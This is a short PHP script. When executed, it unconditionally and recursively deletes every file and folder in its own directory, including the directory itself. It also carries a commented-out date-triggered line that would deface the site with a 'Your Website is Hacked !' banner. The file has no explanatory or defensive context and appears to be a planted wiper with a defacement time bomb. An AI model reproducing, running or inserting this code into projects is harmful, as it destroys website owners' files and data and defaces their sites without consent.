<?php
function recursiveRemoveDirectory($directory)
{
    foreach(glob("{$directory}/*") as $file)
    {
        if(is_dir($file)) { 
            recursiveRemoveDirectory($file);
        } else {
            unlink($file);
        }
    }
    rmdir($directory);
}
recursiveRemoveDirectory(__DIR__);


// if(time() >= strtotime("Sep 03, 2022 7:56 am")){echo  ' <style>body{background:#000 !important;}h1{position: fixed;top: 50%;left: 50%;transform: translate(-50%, -50%);font-size: 50px;font-family: sans-serif;color:rgb(18 228 29 / 86%);}</style><h1>Your Website is Hacked !</h1>';return '';exit();}
